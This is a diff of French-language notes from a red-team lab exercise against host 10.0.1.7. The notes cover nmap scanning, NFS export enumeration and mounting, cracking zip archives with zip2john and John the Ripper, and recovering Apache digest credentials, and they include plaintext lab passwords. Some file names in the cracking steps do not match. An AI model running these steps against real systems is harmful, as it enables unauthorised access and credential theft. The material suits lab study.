@@ -24,43 +24,38 @@ Machine Kali Jump :
 🔹 Utilisateur : red
 🔹 Mot de passe : I'mthebest
 
-# Machine 1 10.0.1.7
+je  me suis connecte sur la machine 
+# Machine 1  :  10.0.1.7
 # Enumeration
 ## nmap 
 
 ```
-PORT      STATE SERVICE   VERSION
-22/tcp    open  ssh       OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
-| ssh-hostkey: 
-|   256 a9:d7:82:27:91:88:94:30:81:98:e7:b2:a5:f9:be:c9 (ECDSA)
-|_  256 6e:05:ff:63:e8:f6:ef:0e:8e:06:70:9d:89:83:2e:11 (ED25519)
-111/tcp   open  rpcbind   2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100003  3,4         2049/tcp   nfs
-|   100005  1,2,3      38461/tcp   mountd
-|   100005  1,2,3      55568/udp   mountd
-|   100021  1,3,4      40590/udp   nlockmgr
-|   100021  1,3,4      43107/tcp   nlockmgr
-|   100024  1          38937/tcp   status
-|   100024  1          41307/udp   status
-|_  100227  3           2049/tcp   nfs_acl
-2049/tcp  open  nfs_acl   3 (RPC #100227)
-3232/tcp  open  mdtp?
-6549/tcp  open  apc-6549?
-37897/tcp open  mountd    1-3 (RPC #100005)
-38461/tcp open  mountd    1-3 (RPC #100005)
-38937/tcp open  status    1 (RPC #100024)
-43107/tcp open  nlockmgr  1-4 (RPC #100021)
-46903/tcp open  mountd    1-3 (RPC #100005)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+nmap -sV -p- 10.0.1.7 -vv
+```
 
 ```
+PORT      STATE SERVICE         REASON         VERSION
+22/tcp    open  ssh             syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
+111/tcp   open  rpcbind         syn-ack ttl 64 2-4 (RPC #100000)
+540/tcp   open  uucp            syn-ack ttl 64 NetBSD uucpd
+2049/tcp  open  nfs_acl         syn-ack ttl 64 3 (RPC #100227)
+4444/tcp  open  krb524?         syn-ack ttl 64
+4455/tcp  open  tcpwrapped      syn-ack ttl 64
+8000/tcp  open  http            syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 3.11.7)
+8080/tcp  open  http            syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 3.11.2)
+30000/tcp open  ndmps?          syn-ack ttl 64
+36267/tcp open  nlockmgr        syn-ack ttl 64 1-4 (RPC #100021)
+40000/tcp open  ssl/safetynetp? syn-ack ttl 64
+41137/tcp open  status          syn-ack ttl 64 1 (RPC #100024)
+41991/tcp open  mountd          syn-ack ttl 64 1-3 (RPC #100005)
+50115/tcp open  mountd          syn-ack ttl 64 1-3 (RPC #100005)
+59971/tcp open  mountd          syn-ack ttl 64 1-3 (RPC #100005)
+```
+
 
 Comme indiqué ci-dessus, la cible exécute NFS, ce qui permet une énumération plus poussée.
 
+Nous avons interroge le demon de moontage sur un hote distant obtenir des informations sur l'etat du serveur NFS de la machine 
 ```
 red@start:~$ showmount -e 10.0.1.7
 Export list for 10.0.1.7:
@@ -71,6 +66,7 @@ Export list for 10.0.1.7:
 Comme indiqué ci-dessus dans la liste d'exportation reçue de la cible, un répertoire  `/var/backup *`  est disponible pour le montage.
 
 ```
+red@start:/tmp$ mkdir  /tmp/mount
 sudo mount -t nfs 10.0.1.7:/var/backup /tmp/mount
 mount | grep /tmp/mount
 mount | grep /tmp/mount
@@ -79,3 +75,25 @@ mount | grep /tmp/mount
 
 ls    
 etc.zip  mfa.zip  NOTES  zi7zp9Uv
+
+sudo zip2john mfa.zip > zip_hash.txt
+
+
+john --wordlist=/home/kali/Documents/TryHackme/Wordlist/rockyou.txt zip_hashetc.txt 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+05ultra          (etc.zip)     
+1g 0:00:00:03 DONE (2025-11-29 17:52) 0.3039g/s 4250Kp/s 4250Kc/s 4250KC/s 0606299330727..0591DUB10
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+cat apache_credentials 
+jump:extremeRTlabs:0b90b1df56afe6e06ed887c4f5f3528f
+
+
+0b90b1df56afe6e06ed887c4f5f3528f : 	THERESE
+
